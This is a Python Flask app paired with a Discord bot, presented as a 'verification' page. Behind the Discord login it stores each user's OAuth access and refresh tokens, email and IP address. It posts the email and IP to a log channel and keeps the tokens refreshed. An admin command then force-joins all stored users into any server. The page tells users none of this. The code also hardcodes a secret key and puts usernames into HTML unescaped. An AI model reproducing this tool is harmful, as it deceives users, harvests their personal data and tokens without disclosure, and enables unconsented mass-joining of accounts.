import sqlite3
import requests
import os
import threading
import discord
from discord import app_commands
from discord.ext import commands, tasks
from discord.ui import View, Button
from flask import Flask, request, jsonify

# Flask
app = Flask(__name__)
app.secret_key = 'terufnisnotop'

# 環境変数
CLIENT_ID = os.environ.get('CLIENT_ID')
CLIENT_SECRET = os.environ.get('CLIENT_SECRET')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
REDIRECT_URI = os.environ.get('REDIRECT_URI')
GUILD_ID = os.environ.get('GUILD_ID')
ROLE_ID = os.environ.get('ROLE_ID')
LOG_CHANNEL_ID = os.environ.get('LOG_CHANNEL_ID')

# DB初期化
def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users 
                 (user_id TEXT PRIMARY KEY, access_token TEXT, refresh_token TEXT, email TEXT, ip_address TEXT)''')
    conn.commit()
    conn.close()

init_db()

def refresh_user_token(user_id, refresh_token):
    url = "https://discord.com/api/v10/oauth2/token"
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'refresh_token',
        'refresh_token': refresh_token
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(url, data=data, headers=headers)
    if response.status_code == 200:
        new_tokens = response.json()
        new_access = new_tokens['access_token']
        new_refresh = new_tokens['refresh_token']
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("UPDATE users SET access_token = ?, refresh_token = ? WHERE user_id = ?",
                  (new_access, new_refresh, user_id))
        conn.commit()
        conn.close()
        return new_access
    return None

# Flask ルート
@app.route('/')
def index():
    auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20guilds.join%20email"
    return f'''
        <body style="background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif;">
            <div style="text-align: center;">
                <h1>Discord Verification</h1>
                <p style="color: #888;">続行するには認証ボタンを押してください</p>
                <a href="{auth_url}"><button style="padding: 15px 30px; font-size: 18px; cursor: pointer; border-radius: 10px; border: none; background-color: #5865F2; color: white;">Discordで認証する</button></a>
            </div>
        </body>
    '''

@app.route('/callback')
def callback():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    code = request.args.get('code')
    if not code:
        return "認可コードが見つかりません。", 400

    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    r = requests.post('https://discord.com/api/oauth2/token', data=data)
    token_data = r.json()

    if 'access_token' not in token_data:
        return jsonify({"error": "トークン取得失敗", "response": token_data}), 400

    access_token = token_data['access_token']
    refresh_token = token_data.get('refresh_token', '')

    user_headers = {'Authorization': f'Bearer {access_token}'}
    user_info = requests.get('https://discord.com/api/users/@me', headers=user_headers).json()
    
    user_id = user_info['id']
    username = user_info['username']
    email = user_info.get('email', '不明')
    avatar = user_info.get('avatar', '')

    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, access_token, refresh_token, email, ip_address) VALUES (?, ?, ?, ?, ?)", 
              (user_id, access_token, refresh_token, email, user_ip))
    conn.commit()
    conn.close()

    bot_headers = {"Authorization": f"Bot {BOT_TOKEN}"}

    requests.put(
        f"https://discord.com/api/guilds/{GUILD_ID}/members/{user_id}",
        headers=bot_headers,
        json={"access_token": access_token}
    )

    if ROLE_ID:
        requests.put(
            f"https://discord.com/api/guilds/{GUILD_ID}/members/{user_id}/roles/{ROLE_ID}",
            headers=bot_headers
        )

    if LOG_CHANNEL_ID:
        log_data = {
            "embeds": [{
                "title": "🛡️ 詳細認証ログ",
                "description": (
                    f"**ユーザー:** <@{user_id}>\n"
                    f"**ID:** `{user_id}`\n"
                    f"**メール:** `{email}`\n"
                    f"**IP:** `{user_ip}`"
                ),
                "color": 0x2f3136,
                "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png"}
            }]
        }
        requests.post(
            f"https://discord.com/api/channels/{LOG_CHANNEL_ID}/messages",
            headers=bot_headers,
            json=log_data
        )

    return f'''
    <!DOCTYPE html>
    <html lang="ja">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>認証完了</title>
        <style>
            body {{ background-color: #000000; color: #ffffff; font-family: 'Helvetica Neue', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
            .card {{ background-color: #1a1a1a; padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #333; max-width: 400px; width: 90%; }}
            .avatar {{ width: 100px; height: 100px; border-radius: 50%; border: 3px solid #5865F2; margin-bottom: 20px; }}
            h1 {{ font-size: 24px; margin-bottom: 10px; }}
            .status {{ color: #43b581; font-weight: bold; font-size: 18px; }}
            .sub-text {{ color: #aaa; font-size: 14px; margin-top: 15px; }}
        </style>
    </head>
    <body>
        <div class="card">
            <img src="https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png" class="avatar" alt="Avatar">
            <h1>{username}</h1>
            <p class="status">✅ 認証に成功しました</p>
            <p class="sub-text">このタブを閉じても大丈夫です。</p>
        </div>
    </body>
    </html>
    '''

# Discord Bot
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f'Bot logged in as {bot.user}')
    auto_refresh_loop.start()

@tasks.loop(hours=120)
async def auto_refresh_loop():
    print("🔄 トークンリフレッシュ開始...")
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT user_id, refresh_token FROM users")
    users = c.fetchall()
    conn.close()
    count = 0
    for user_id, refresh_token in users:
        if refresh_token:
            if refresh_user_token(user_id, refresh_token):
                count += 1
    print(f"✅ リフレッシュ完了 ({count}件)")

@auto_refresh_loop.before_loop
async def before_refresh():
    await bot.wait_until_ready()

@bot.tree.command(name="backup-member", description="保存済みのユーザーをこのサーバーに参加させます")
@app_commands.checks.has_permissions(administrator=True)
async def backup_member(interaction: discord.Interaction):
    target_guild_id = str(interaction.guild_id)
    await interaction.response.send_message("メンバー復旧を開始します...", ephemeral=True)
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT user_id, access_token, refresh_token FROM users")
    users = c.fetchall()
    conn.close()

    success = 0
    failed = 0

    for user_id, access_token, refresh_token in users:
        url = f"https://discord.com/api/v10/guilds/{target_guild_id}/members/{user_id}"
        headers = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
        response = requests.put(url, headers=headers, json={"access_token": access_token})
        
        if response.status_code == 401 and refresh_token:
            new_access = refresh_user_token(user_id, refresh_token)
            if new_access:
                response = requests.put(url, headers=headers, json={"access_token": new_access})

        if response.status_code in [201, 204]:
            success += 1
        else:
            failed += 1

    await interaction.followup.send(f"完了！✅成功: {success}人 / ❌失敗: {failed}人", ephemeral=True)

# FlaskとBotを同時起動
def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))

if __name__ == '__main__':
    t = threading.Thread(target=run_flask)
    t.daemon = True
    t.start()
    bot.run(BOT_TOKEN)
